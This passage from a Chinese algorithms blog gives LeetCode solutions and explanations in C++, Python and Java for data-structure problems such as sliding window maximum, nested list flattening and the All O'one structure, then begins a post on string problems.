均为空 对于21354，我们先按顺序放入input，栈为：21354（右边栈顶） 如果要输出，则都放入output， 栈就变成了 45312 （直接反过来了） 接着如果有新的数push,也只要到input即可。直到output为空了，才继续从input拿 C++ 1234567891011121314151617181920212223242526272829303132class Queue &#123; stack&lt;int&gt; input,output;public: // Push element x to the back of queue. void push(int x) &#123; input.push(x); &#125; // Removes the element from in front of queue. void pop(void) &#123; peek(); output.pop(); &#125; // Get the front element. int peek(void) &#123; if(output.empty())&#123; while(!input.empty())&#123; output.push(input.top()); input.pop(); &#125; &#125; return output.top(); &#125; // Return whether the queue is empty. bool empty(void) &#123; return input.empty() and output.empty(); &#125;&#125;; Python 12345678910111213141516171819202122232425262728293031323334353637class Queue(object): def __init__(self): &quot;&quot;&quot; initialize your data structure here. &quot;&quot;&quot; self._input = [] self._output = [] def push(self, x): &quot;&quot;&quot; :type x: int :rtype: nothing &quot;&quot;&quot; self._input.append(x) def pop(self): &quot;&quot;&quot; :rtype: nothing &quot;&quot;&quot; self.peek() self._output.pop() def peek(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; if not self._output: while self._input: self._output.append(self._input[-1]) self._input.pop() return self._output[-1] def empty(self): &quot;&quot;&quot; :rtype: bool &quot;&quot;&quot; return not self._input and not self._output 239. Sliding Window Maximum Given an array nums, there is a sliding window of size k which is moving from the very left of the array to the very right. You can only see the _k_numbers in the window. Each time the sliding window moves right by one position. For example, Given nums = [1,3,-1,-3,5,3,6,7], and k = 3. 123456789Window position Max--------------- -----[1 3 -1] -3 5 3 6 7 3 1 [3 -1 -3] 5 3 6 7 3 1 3 [-1 -3 5] 3 6 7 5 1 3 -1 [-3 5 3] 6 7 5 1 3 -1 -3 [5 3 6] 7 6 1 3 -1 -3 5 [3 6 7] 7 Therefore, return the max sliding window as [3,3,5,5,6,7]. Note: You may assume k is always valid, ie: 1 ≤ k ≤ input array's size for non-empty array. Follow up: Could you solve it in linear time? Hint: How about using a data structure such as deque (double-ended queue)? The queue size need not be the same as the window’s size. Remove redundant elements and the queue should store only elements that need to be considered. 题目地址：leetcode Sliding Window Maximum 题意：给定一个数组和一个窗口大小K，要你从数组中按顺序将所有相邻的K个数中最大值输出。 思路： 方法1 单调队列 最暴力的方法当然是枚举起点和接下来的K个数，复杂度O(nk) 这题涉及RMQ等，有方法可以做到O(nlogn)的预处理，然后O(1)的查询，总复杂度O(nlogn) 当然这题用堆也可以。。 线性的时间怎么办？ 那肯定是要观察窗口移动过程中，移出了一个数，然后加入了一个数，我也想到了双端队列。 然而感觉一个长度为K的双端队列没啥用啊？点开hint看到hint2我就醒悟了。 我们维护一个双端队列，第一个元素为最大值，对于窗口移动过程中，新加进来的元素x从队尾向前比较，把小于它的数抛弃掉。（因为x不但大而且在后面，前面的而且小的数是不会为窗口内的最大值的）。此外，若第一个元素已经在窗口外了，那么抛弃第一个即可。 由于队列的长度不可能超过n个，因此复杂度为O(n)。 c++ 12345678910111213141516171819202122232425class Solution &#123;public: vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) &#123; if (nums.empty()) return &#123;&#125;; deque&lt;int&gt; q; for (int i = 0; i &lt; k; ++i) &#123; while (!q.empty() &amp;&amp; nums[i] &gt; nums[q.back()]) &#123; q.pop_back(); &#125; q.emplace_back(i); &#125; vector&lt;int&gt; ans = &#123;nums[q.front()]&#125;; for (int i = k; i &lt; nums.size(); ++i) &#123; if (q.front() + k &lt;= i) &#123; q.pop_front(); &#125; while (!q.empty() &amp;&amp; nums[i] &gt; nums[q.back()]) &#123; q.pop_back(); &#125; q.emplace_back(i); ans.emplace_back(nums[q.front()]); &#125; return ans; &#125;&#125;; Python 123456789101112131415class Solution: def maxSlidingWindow(self, nums: List[int], k: int) -&gt; List[int]: if not nums: return [] if k == 1: return nums ans = [] q = deque() for i in range(len(nums)): if q and q[0] &lt;= i - k: q.popleft() while q and nums[q[-1]] &lt;= nums[i]: q.pop() q.append(i) if i &gt;= k - 1: ans.append(nums[q[0]]) return ans 方法2 分块法 观察样例： 1234567--------------- -----[1 3 -1] -3 5 3 6 7 3 1 [3 -1 -3] 5 3 6 7 3 1 3 [-1 -3 5] 3 6 7 5 1 3 -1 [-3 5 3] 6 7 5 1 3 -1 -3 [5 3 6] 7 6 1 3 -1 -3 5 [3 6 7] 7 如果我们每k个数分一组，那么上述的例子中，[1, 3, -1]为一组， [-3, 5, 3]为一组，[6, 7]为一组 对于\\(i \\in [0, n - 1]\\)来说，若我们可以求得left[i + k - 1]（i所在的组从前往后到i时最大的数）和right[i]（i所在的组从后往前到i时最大的数），那么问题就解决了。 举例来说，若i == 0，则显然是成立的，left[2]和right[0]都是3 若i == 1，则此时滑动窗口[3, -1, -3]跨越了两个分组，left[3] = -3而right[1] =3，所以答案是3。这个时候你应该看出来了，当跨越两个分组的时候，left[i + k - 1] 相当于求下一个分组在当前滑动窗口范围内的最大值，而right[i]则是当前分组在滑动窗口内的最大值. 因此可以写出如下的代码： 123456789101112131415161718192021222324252627282930class Solution &#123;public: vector&lt;int&gt; maxSlidingWindow(vector&lt;int&gt;&amp; nums, int k) &#123; if (nums.empty()) return &#123;&#125;; vector&lt;int&gt; left(nums.size(), 0); vector&lt;int&gt; right(nums.size(), 0); for (std::size_t i = 0; i &lt; nums.size(); ++i) &#123; if (i % k == 0) &#123; left[i] = nums[i]; &#125; else &#123; left[i] = max(left[i - 1], nums[i]); &#125; &#125; for (int i = static_cast&lt;int&gt;(nums.size()) - 1; i &gt;= 0; --i) &#123; if ((i + 1) % k == 0 || i + 1 == nums.size()) &#123; right[i] = nums[i]; &#125; else &#123; right[i] = max(right[i + 1], nums[i]); &#125; &#125; vector&lt;int&gt; ans(nums.size() + 1 - k); for (int i = 0; i + k &lt;= nums.size(); ++i) &#123; ans[i] = max(left[i + k - 1], right[i]); &#125; return ans; &#125;&#125;; 341. Flatten Nested List Iterator Given a nested list of integers, implement an iterator to flatten it. Each element is either an integer, or a list -- whose elements may also be integers or other lists. Example 1: Given the list [[1,1],2,[1,1]], By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1]. Example 2: Given the list [1,[4,[6]]], By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6]. 题目地址：leetcode Flatten Nested List Iterator 题意：给定一个NestedInteger 列表，要求把它展开。 比如[[1,1],2,[1,1]] （里面每一项均为NestedInteger类型）展开为[1,1,2,1,1]. 思路： 首先来看看定义： 1234567891011121314151617181920212223# &quot;&quot;&quot;# This is the interface that allows for creating nested lists.# You should not implement it, or speculate about its implementation# &quot;&quot;&quot;#class NestedInteger(object):# def isInteger(self):# &quot;&quot;&quot;# @return True if this NestedInteger holds a single integer, rather than a nested list.# :rtype bool# &quot;&quot;&quot;## def getInteger(self):# &quot;&quot;&quot;# @return the single integer that this NestedInteger holds, if it holds a single integer# Return None if this NestedInteger holds a nested list# :rtype int# &quot;&quot;&quot;## def getList(self):# &quot;&quot;&quot;# @return the nested list that this NestedInteger holds, if it holds a nested list# Return None if this NestedInteger holds a single integer# :rtype List[NestedInteger] 发现该类有3个函数，是否整数、整数就取整数、列表就取列表。 这题要实现 NestedIterator类要实现3个接口，如下： 1234567891011121314151617181920class NestedIterator(object): def __init__(self, nestedList): &quot;&quot;&quot; Initialize your data structure here. :type nestedList: List[NestedInteger] &quot;&quot;&quot; def next(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; def hasNext(self): &quot;&quot;&quot; :rtype: bool &quot;&quot;&quot; 调用方式为： 123# Your NestedIterator object will be instantiated and called as such:# i, v = NestedIterator(nestedList), []# while i.hasNext(): v.append(i.next()) 确保你已经明白题意在往下看。 看到待展开的表达式时嵌套的，就想到，可以用递归开挂~ 水水的1A。 思想是初始化先处理好全部，接下来只要从结果集合中拿就好了 12345678910111213141516171819202122232425262728class NestedIterator(object): def __init__(self, nestedList): &quot;&quot;&quot; Initialize your data structure here. :type nestedList: List[NestedInteger] &quot;&quot;&quot; def solve(nestedList): res = [] for x in nestedList: if x.isInteger(): res.append(x.getInteger()) else: res.extend(solve(x.getList())) return res self.ans = solve(nestedList)[::-1] def next(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; return self.ans.pop() def hasNext(self): &quot;&quot;&quot; :rtype: bool &quot;&quot;&quot; return len(self.ans) != 0 但其实递归的方法把所有的解都存起来了，严格的说，不是迭代Iterator，不过给我们实现Iterator提供了思路，就是把递归改成迭代。 怎么改呢~ 用栈啊，当 现在的栈顶的不是整形(那就是List，调用getList)，就把List取出，在压入栈，循环即可。 而实现上，比刚才的递归还要优雅： 12345678910111213141516171819202122class NestedIterator(object): def __init__(self, nestedList): &quot;&quot;&quot; Initialize your data structure here. :type nestedList: List[NestedInteger] &quot;&quot;&quot; self.stack = nestedList[::-1] def next(self): &quot;&quot;&quot; :rtype: int &quot;&quot;&quot; return self.stack.pop().getInteger() def hasNext(self): &quot;&quot;&quot; :rtype: bool &quot;&quot;&quot; while self.stack and not self.stack[-1].isInteger(): self.stack.extend(self.stack.pop().getList()[::-1]) return len(self.stack) != 0 352. Data Stream as Disjoint Intervals Given a data stream input of non-negative integers a1, a2, ..., an, ..., summarize the numbers seen so far as a list of disjoint intervals. For example, suppose the integers from the data stream are 1, 3, 7, 2, 6, ..., then the summary will be: 123456[1, 1][1, 1], [3, 3][1, 1], [3, 3], [7, 7][1, 3], [7, 7][1, 3], [6, 7] Follow up: What if there are lots of merges and the number of disjoint intervals are small compared to the data stream's size? 题目地址：leetcode Data Stream as Disjoint Intervals 题意：要求实现一个数据结构，可以满足不断添加数字，并进行区间的更新。 思路： 这题貌似二分查找也可以，手写BST也可以，不过还是用java的TreeMap实现起来比较方便。 我们根据区间起始位置（就是start）作为BST 的key，对于要添加的数val，查找其左右区间。。 ceil 满足 val &lt; key , floor 满足 key &lt;= val 然后判断其范围进行合并。 感觉没啥好说的。。 PS: C++只有lower_bound和upper_bound， 不像java treemap那么爽 ( ╯□╰ ) Python好像没看过平衡树的样子？ 12345678910111213141516171819202122232425262728public class SummaryRanges &#123; TreeMap&lt;Integer, Interval&gt; map; public SummaryRanges() &#123; map = new TreeMap&lt;Integer, Interval&gt;(); &#125; public void addNum(int val) &#123; Integer ceil = map.higherKey(val); // val &lt; key Integer floor = map.floorKey(val); // key &lt;= val if (floor != null &amp;&amp; map.get(floor).end + 1 &gt;= val) &#123; if (ceil != null &amp;&amp; ceil == val + 1) &#123; map.get(floor).end = map.get(ceil).end; map.remove(ceil); &#125; else map.get(floor).end = Math.max(map.get(floor).end, val); &#125; else if (ceil != null &amp;&amp; ceil == val + 1) &#123; map.put(val, new Interval(val, map.get(ceil).end)); map.remove(ceil); &#125; else map.put(val, new Interval(val, val)); &#125; public List&lt;Interval&gt; getIntervals() &#123; return new ArrayList&lt;&gt;(map.values()); &#125;&#125; 432. All O'one Data Structure Implement a data structure supporting the following operations: Inc(Key) - Inserts a new key with value 1. Or increments an existing key by 1. Key is guaranteed to be a non-empty string. Dec(Key) - If Key's value is 1, remove it from the data structure. Otherwise decrements an existing key by 1. If the key does not exist, this function does nothing. Key is guaranteed to be a non-empty string. GetMaxKey() - Returns one of the keys with maximal value. If no element exists, return an empty string \"\". GetMinKey() - Returns one of the keys with minimal value. If no element exists, return an empty string \"\". Challenge: Perform all these in O(1) time complexity. 题目地址：leetcode All O'one Data Structure 题目大意：要求实现一个数据结构，四个接口都需要在O(1)的时间内执行。 思路： 双向链表+hash 链表中每个节点保存对应的val，以及相应的key。 求最大和最小key只需要从头或者尾巴拿即可。 C++ 由于c++有双向链表的接口，因此可以直接用： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768class AllOne &#123;private: struct LinkListNode &#123; const int val; unordered_set&lt;string&gt; keys; &#125;; list&lt;LinkListNode&gt; linklist; unordered_map&lt;string, list&lt;LinkListNode&gt;::iterator&gt; keyToNode; void removeNodeKey(string key,list&lt;LinkListNode&gt;::iterator node) &#123; node-&gt;keys.erase(key); if (!node-&gt;keys.size()) linklist.erase(node); &#125;public: /** Inserts a new key &lt;Key&gt; with value 1. Or increments an existing key by 1. */ void inc(string key) &#123; auto it = keyToNode.find(key); int val = 0; if (it != keyToNode.end()) &#123; auto next = it-&gt;second, node = next++; if (next == linklist.end() || next-&gt;val != node-&gt;val + 1) next = linklist.insert(next, &#123; node-&gt;val + 1,&#123; key &#125; &#125;); else next-&gt;keys.insert(key); removeNodeKey(key, node); keyToNode[key] = next; &#125; else &#123; auto node = linklist.begin() != linklist.end() &amp;&amp; linklist.begin()-&gt;val == 1 ? linklist.begin() : linklist.end(); if (node == linklist.end()) node = linklist.insert(linklist.begin(), &#123; 1,&#123; key &#125; &#125;); else linklist.begin()-&gt;keys.insert(key); keyToNode[key] = node; &#125; &#125; /** Decrements an existing key by 1. If Key&#x27;s value is 1, remove it from the data structure. */ void dec(string key) &#123; auto it = keyToNode.find(key); if (it == keyToNode.end()) return; auto pre = it-&gt;second, node = pre != linklist.begin() ? pre-- : pre; if (node-&gt;val == 1) &#123; keyToNode.erase(key); removeNodeKey(key, node); &#125; else &#123; if (node == linklist.begin() || pre-&gt;val != node-&gt;val - 1) pre = linklist.insert(node, &#123; node-&gt;val - 1,&#123; key &#125; &#125;); else pre-&gt;keys.insert(key); keyToNode[key] = pre; removeNodeKey(key, node); &#125; &#125; /** Returns one of the keys with maximal value. */ string getMaxKey() &#123; return linklist.empty() ? &quot;&quot; : *(linklist.rbegin()-&gt;keys.begin()); &#125; /** Returns one of the keys with Minimal value. */ string getMinKey() &#123; return linklist.empty() ? &quot;&quot; : *(linklist.begin()-&gt;keys.begin()); &#125;&#125;; 自己写的双向链表 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143struct LinkListNode &#123; LinkListNode *next, *pre; const int val; unordered_set&lt;string&gt; keys; LinkListNode(int val, string key) :val(val) &#123; if (!key.empty()) keys.insert(key); next = pre = NULL; &#125;&#125;;class LinkList &#123;private: LinkListNode *head, *tail; void insertNode(LinkListNode *pre, LinkListNode *node, LinkListNode *next) &#123; pre-&gt;next = node; node-&gt;pre = pre; node-&gt;next = next; next-&gt;pre = node; &#125;public: LinkList() &#123; head = new LinkListNode(0, &quot;&quot;); tail = new LinkListNode(0, &quot;&quot;); head-&gt;next = tail; tail-&gt;pre = head; &#125; ~LinkList() &#123; while (head != NULL) &#123; LinkListNode *p = head; head = head-&gt;next; delete p; &#125; &#125; LinkListNode * removeKey(string key, LinkListNode *node, bool isDec) &#123; node-&gt;keys.erase(key); if (!node-&gt;keys.size()) &#123; LinkListNode *pre = node-&gt;pre, *next = node-&gt;next; pre-&gt;next = next; next-&gt;pre = pre; delete node; return pre; &#125; return isDec ? node-&gt;pre : node; &#125; LinkListNode * inc(string key, int val, LinkListNode * node) &#123; if (node == NULL) node = head; if (node-&gt;next-&gt;val == val + 1) &#123; node = node-&gt;next; node-&gt;keys.insert(key); return node; &#125; else &#123; LinkListNode *newNode = new LinkListNode(val + 1, key); insertNode(node, newNode, node-&gt;next); return newNode; &#125; &#125; LinkListNode * dec(string key, int val, LinkListNode * node) &#123; if (node == NULL) node = head; if (node != head &amp;&amp; node-&gt;val == val - 1) &#123; node-&gt;keys.insert(key); return node; &#125; else &#123; LinkListNode *newNode = new LinkListNode(val - 1, key); insertNode(node, newNode, node-&gt;next); return newNode; &#125; &#125; string getMinKey() &#123; if (head-&gt;next == tail) return &quot;&quot;; return *head-&gt;next-&gt;keys.begin(); &#125; string getMaxKey() &#123; if (head-&gt;next == tail) return &quot;&quot;; return *tail-&gt;pre-&gt;keys.begin(); &#125;&#125;;class AllOne &#123;private: LinkList *linklist; unordered_map&lt;string, LinkListNode*&gt; keyToNode;public: /** Initialize your data structure here. */ AllOne() &#123; linklist = new LinkList(); &#125; /** Inserts a new key &lt;Key&gt; with value 1. Or increments an existing key by 1. */ void inc(string key) &#123; auto it = keyToNode.find(key); int val = 0; LinkListNode * node = NULL; if (it != keyToNode.end()) &#123; node = it-&gt;second; val = node-&gt;val; node = linklist-&gt;removeKey(key, node, false); &#125; keyToNode[key] = linklist-&gt;inc(key, val, node); &#125; /** Decrements an existing key by 1. If Key&#x27;s value is 1, remove it from the data structure. */ void dec(string key) &#123; auto it = keyToNode.find(key); if (it == keyToNode.end()) return; LinkListNode * node = it-&gt;second; int val = node-&gt;val; node = linklist-&gt;removeKey(key, node, true); if (val == 1) &#123; keyToNode.erase(key); &#125; else &#123; keyToNode[key] = linklist-&gt;dec(key, val, node); &#125; &#125; /** Returns one of the keys with maximal value. */ string getMaxKey() &#123; return linklist-&gt;getMaxKey(); &#125; /** Returns one of the keys with Minimal value. */ string getMinKey() &#123; return linklist-&gt;getMinKey(); &#125;&#125;; Java 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131class AllOne &#123; private LinkList linklist = new LinkList(); private HashMap&lt;String, LinkListNode&gt; keyToNode = new HashMap&lt;&gt;(); public AllOne() &#123;&#125; /** * Inserts a new key &lt;Key&gt; with value 1. Or increments an existing key by 1. */ public void inc(String key) &#123; LinkListNode node = keyToNode.getOrDefault(key, null); int val = 0; if (node != null) &#123; val = node.val; node = linklist.removeKey(key, node, false); &#125; keyToNode.put(key, linklist.inc(key, val, node)); &#125; /** * Decrements an existing key by 1. If Key&#x27;s value is 1, remove it from the data structure. */ public void dec(String key) &#123; LinkListNode node = keyToNode.getOrDefault(key, null); if (node == null) return; int val = node.val; node = linklist.removeKey(key, node, true); if (val == 1) &#123; keyToNode.remove(key); &#125; else &#123; keyToNode.put(key, linklist.dec(key, val, node)); &#125; &#125; /** * Returns one of the keys with maximal value. */ public String getMaxKey() &#123; return linklist.getMaxKey(); &#125; /** * Returns one of the keys with Minimal value. */ public String getMinKey() &#123; return linklist.getMinKey(); &#125;&#125;class LinkListNode &#123; HashSet&lt;String&gt; keys = new HashSet&lt;&gt;(); final int val; LinkListNode next = null, pre = null; public LinkListNode(int val, String key) &#123; this.val = val; if (key != null) keys.add(key); &#125;&#125;class LinkList &#123; private LinkListNode head = new LinkListNode(0, null); private LinkListNode tail = new LinkListNode(0, null); public LinkList() &#123; head.next = tail; tail.pre = head; &#125; public LinkListNode removeKey(String key, LinkListNode node, boolean isDec) &#123; node.keys.remove(key); if (node.keys.size() == 0) &#123; LinkListNode pre = node.pre, next = node.next; pre.next = next; next.pre = pre; return pre; &#125; return isDec ? node.pre : node; &#125; private void insertNode(LinkListNode pre, LinkListNode node, LinkListNode next) &#123; pre.next = node; node.pre = pre; node.next = next; next.pre = node; &#125; public LinkListNode inc(String key, int val, LinkListNode node) &#123; if (node == null) node = head; if (node.next.val == val + 1) &#123; node = node.next; node.keys.add(key); return node; &#125; else &#123; LinkListNode newNode = new LinkListNode(val + 1, key); insertNode(node, newNode, node.next); return newNode; &#125; &#125; public LinkListNode dec(String key, int val, LinkListNode node) &#123; if (node == null) node = head; if (node != head &amp;&amp; node.val == val - 1) &#123; node.keys.add(key); return node; &#125; else &#123; LinkListNode newNode = new LinkListNode(val - 1, key); insertNode(node, newNode, node.next); return newNode; &#125; &#125; public String getMinKey() &#123; for (String key : head.next.keys) return key; return &quot;&quot;; &#125; public String getMaxKey() &#123; for (String key : tail.pre.keys) return key; return &quot;&quot;; &#125;&#125; Python 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112class LinkListNode(object): def __init__(self, val): self.val = val self.keys = set() self.pre = self.next = Noneclass LinkList(object): def __init__(self): self.head = LinkListNode(0) self.tail = LinkListNode(0) self.head.next = self.tail self.tail.pre = self.head def remove_key(self, node, key, is_dec=False): node.keys.remove(key) if not node.keys: _pre, _next = node.pre, node.next _pre.next = _next _next.pre = _pre del node return _pre return node if not is_dec else node.pre def _insert_node(self, _pre, new_node, _next): _pre.next = new_node new_node.pre = _pre _next.pre = new_node new_node.next = _next def inc_key(self, key, val, node=None): if not node: node = self.head if node.next.val == val + 1: node = node.next node.keys.add(key) return node else: new_node = LinkListNode(val + 1) new_node.keys.add(key) self._insert_node(node, new_node, node.next) return new_node def dec_key(self, key, val, node=None): if not node: node = self.head if node != self.head and node.val == val - 1: node.keys.add(key) return node else: new_node = LinkListNode(val - 1) new_node.keys.add(key) self._insert_node(node, new_node, node.next) return new_node def get_max_key(self): for key in self.tail.pre.keys: return key return &quot;&quot; def get_min_key(self): for key in self.head.next.keys: return key return &quot;&quot;class AllOne(object): def __init__(self): self.key_to_node = &#123;&#125; self.linklist = LinkList() def inc(self, key): &quot;&quot;&quot; Inserts a new key &lt;Key&gt; with value 1. Or increments an existing key by 1. :type key: str :rtype: void &quot;&quot;&quot; node = self.key_to_node.get(key, None) if node: # exists val = node.val node = self.linklist.remove_key(node, key) else: val = 0 self.key_to_node[key] = self.linklist.inc_key(key, val, node) def dec(self, key): &quot;&quot;&quot; Decrements an existing key by 1. If Key&#x27;s value is 1, remove it from the data structure. :type key: str :rtype: void &quot;&quot;&quot; node = self.key_to_node.get(key, None) if not node: return val = node.val node = self.linklist.remove_key(node, key,is_dec=True) if val == 1: del self.key_to_node[key] else: self.key_to_node[key] = self.linklist.dec_key(key, val, node) def getMaxKey(self): &quot;&quot;&quot; Returns one of the keys with maximal value. :rtype: str &quot;&quot;&quot; return self.linklist.get_max_key() def getMinKey(self): &quot;&quot;&quot; Returns one of the keys with Minimal value. :rtype: str &quot;&quot;&quot; return self.linklist.get_min_key() 503. 下一个更大元素 II 给定一个循环数组（最后一个元素的下一个元素是数组的第一个元素），输出每个元素的下一个更大元素。数字 x 的下一个更大的元素是按数组遍历顺序，这个数字之后的第一个比它更大的数，这意味着你应该循环地搜索它的下一个更大的数。如果不存在，则输出 -1。 示例 1: 12345&gt;输入: [1,2,1]&gt;输出: [2,-1,2]&gt;解释: 第一个 1 的下一个更大的数是 2；&gt;数字 2 找不到下一个更大的数； &gt;第二个 1 的下一个最大的数需要循环搜索，结果也是 2。 注意: 输入数组的长度不会超过 10000。 单调栈，首先找到最大的元素下标，向左遍历，同时维护一个栈，这个栈是降序的。 若一个数x，它大于栈顶的元素b，则出栈并把x放入，且x左边的元素的解必然不是b 若一个数x，小于栈顶元素b，则说明它更大的数就是b 12345678910111213141516171819202122232425262728class Solution &#123;public: vector&lt;int&gt; nextGreaterElements(vector&lt;int&gt;&amp; nums) &#123; if (nums.empty()) &#123; return &#123;&#125;; &#125; int max_index = max_element(nums.begin(), nums.end()) - nums.begin(); stack&lt;int&gt; q; q.push(nums[max_index]); vector&lt;int&gt; ans(nums.size(), -1); for (int i = max_index - 1; i &gt;= 0; --i) &#123; while (!q.empty() &amp;&amp; q.top() &lt;= nums[i]) &#123; q.pop(); &#125; ans[i] = q.empty() ? -1 : q.top(); q.push(nums[i]); &#125; for (int i = nums.size() - 1; i &gt; max_index; --i) &#123; while (!q.empty() &amp;&amp; q.top() &lt;= nums[i]) &#123; q.pop(); &#125; ans[i] = q.empty() ? -1 : q.top(); q.push(nums[i]); &#125; return ans; &#125;&#125;; 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"python","slug":"python","permalink":"https://www.hrwhisper.me/tags/python/"},{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"},{"name":"Data Structure","slug":"Data-Structure","permalink":"https://www.hrwhisper.me/tags/Data-Structure/"},{"name":"leetcode","slug":"leetcode","permalink":"https://www.hrwhisper.me/tags/leetcode/"}]},{"title":"leetcode 字符串","slug":"leetcode-string","date":"2015-03-08T02:01:00.000Z","updated":"2021-01-08T13:32:16.869Z","comments":true,"path":"leetcode-string/","link":"","permalink":"https://www.hrwhisper.me/leetcode-string/","excerpt":"本次题解包括 5. Longest Palindromic Substring 6. ZigZag Conversion 8. String to Integer (atoi) 14. Longest Common Prefix 28. Implement strStr() 58. Length of Last Word 125 . Valid Palindrome 131 . Palindrome Partitioning 132 . Palindrome Partitioning II 214 . Shortest Palindrome 336. Palindrome Pairs 796. Rotate String 816. Ambiguous Coordinates 819. Most Common Word","text":"本次题解包括 5. Longest Palindromic Substring 6. ZigZag Conversion 8. String to Integer (atoi) 14. Longest Common Prefix 28. Implement strStr() 58. Length of Last Word 125 . Valid Palindrome 131 . Palindrome Partitioning 132 . Palindrome Partitioning II 214 . Shortest Palindrome 336. Palindrome Pairs 796. Rotate String 816. Ambiguous Coordinates 819. Most Common Word 5. Longest Palindromic Substring Given a string S, find the longest palindromic substring in S. You may assume that the maximum length of S is 1000, and there exists one unique longest palindromic substring. 题目地址：leetcode Longest Palindromic Substring 题意：给定一个字符串S，求一个S的最长子回文串。 思路：最朴素的思想是枚举开头，枚举结尾，判断是否回文，复杂度太高。 我们可以只枚举开头和长度，这样只要O(N^2) C++ 1234567891011121314151617181920class Solution &#123; void isPalindrome(const string &amp;s, int a, int b, int &amp;start, int &amp;len) &#123; for (; a &gt;= 0 &amp;&amp; b &lt; s.size() &amp;&amp; s[a] == s[b]; a--, b++) ; if (len &lt; b - a - 1) &#123; start = a + 1; len = b - a - 1; &#125; &#125;public: string longestPalindrome(string s) &#123; if (s.size() &lt; 2) return s; int start = 0, len = 1; for (int i = 1; i &lt; s.size(); i++) &#123; isPalindrome(s, i - 1, i + 1, start, len); isPalindrome(s, i - 1, i, start, len); &#125; return s.substr(start, len); &#125;&#125;; Java 1234567891011121314151617181920class Solution &#123; private int start, end; private void palindrome(String s, int i, int j) &#123; for (; i &gt;= 0 &amp;&amp; j &lt; s.length() &amp;&amp; s.charAt(i) == s.charAt(j); i--, j++) ; if (end - start &lt; j - i - 1) &#123; start = i + 1; end = j; &#125; &#125; public String longestPalindrome(String s) &#123; if (s.length() &lt;= 1) return s; for (int i = 0; i &lt; s.length(); i++) &#123; palindrome(s, i - 1, i + 1); palindrome(s, i - 1, i); &#125; return s.substring(start, end); &#125;&#125; Python 1234567891011121314151617181920class Solution(object): def longestPalindrome(self, s): &quot;&quot;&quot; :type s: str :rtype: str &quot;&quot;&quot; def helper(i, j): while i &gt;= 0 and j &lt; len(s) and s[i] == s[j]: i -= 1 j += 1 return s[i + 1: j] ans = &#x27;&#x27; for start in range(len(s)): t = helper(start, start) if len(t) &gt; len(ans): ans = t t = helper(start, start + 1) if len(t) &gt; len(ans): ans = t return ans 6. ZigZag Conversion The string \"PAYPALISHIRING\" is written in a zigzag pattern on a given number of rows like this: (you may want to display this pattern in a fixed font for better legibility) 1234P A H NA P L S I I GY I R And then read line by line: \"PAHNAPLSIIGYIR\" Write the code that will take a string and make this conversion given a number of rows: 1string convert(string text, int nRows); convert(\"PAYPALISHIRING\", 3) should return \"PAHNAPLSIIGYIR\". 题目地址：leetcode ZigZag Conversion 题目大意:给定一个zigzag 写法的字符串，要你恢复它 思路： 从上往下，然后从下往上即可。。 C++ 1234567891011121314151617181920class Solution &#123;public: string convert(string s, int numRows) &#123; if(numRows == 1) return s; string rows[numRows]; int cur = 0; bool down = true; for(int i = 0; i &lt; s.size(); i++)&#123; rows[cur] += s[i]; if(cur == 0) down = true; else if(cur == numRows - 1) down = false; if (down) cur++; else cur--; &#125; string ans; for(int i = 0; i &lt; numRows; i++) ans += rows[i]; return ans; &#125;&#125;; Java 无聊写了个找规律的版本，就是先找好第i行下一个间距。。 123456789101112131415161718192021class Solution &#123; public String convert(String s, int numRows) &#123; if(numRows == 1) return s; int[][] diff = new int[numRows][2]; for(int i = 0; i &lt; numRows; i++)&#123; diff[i][0] = (numRows - i - 1) &lt;&lt; 1; diff[i][1] = i &lt;&lt; 1; &#125; diff[0][1] = diff[numRows - 1][0] = diff[0][0]; StringBuilder ans = new StringBuilder(); for(int i = 0; i &lt; numRows; i++)&#123; int up = 1; for(int j = i; j &lt; s.length(); j += diff[i][up])&#123; ans.append(s.charAt(j)); up ^= 1; &#125; &#125; return ans.toString(); &#125;&#125; 8. String to Integer (atoi) mplement atoi which converts a string to an integer. The function first discards as many whitespace characters as necessary until the first non-whitespace character is found. Then, starting from this character, takes an optional initial plus or minus sign followed by as many numerical digits as possible, and interprets them as a numerical value. The string can contain additional characters after those that form the integral number, which are ignored and have no effect on the behavior of this function. If the first sequence of non-whitespace characters in str is not a valid integral number, or if no such sequence exists because either str is empty or it contains only whitespace characters, no conversion is performed. If no valid conversion could be performed, a zero value is returned. Note: Only the space character ' ' is considered as whitespace character. Assume we are dealing with an environment which could only store integers within the 32-bit signed integer range: [−231, 231 − 1]. If the numerical value is out of the range of representable values, INT_MAX (231 − 1) or INT_MIN (−231) is returned. Example 1: 12**Input:** &quot;42&quot;**Output:** 42 Example 2: 12345**Input:** &quot; -42&quot;**Output:** -42**Explanation:** The first non-whitespace character is &#39;-&#39;, which is the minus sign. Then take as many numerical digits as possible, which gets 42. Example 3: 1234**Input:** &quot;4193 with words&quot;**Output:** 4193**Explanation:** Conversion stops at digit &#39;3&#39; as the next character is not a numerical digit. Example 4: 1234**Input:** &quot;words and 987&quot;**Output:** 0**Explanation:** The first non-whitespace character is &#39;w&#39;, which is not a numerical digit or a +&#x2F;- sign. Therefore no valid conversion could be performed. Example 5: 1234**Input:** &quot;-91283472332&quot;**Output:** -2147483648**Explanation:** The number &quot;-91283472332&quot; is out of the range of a 32-bit signed integer. Thefore INT_MIN (−231) 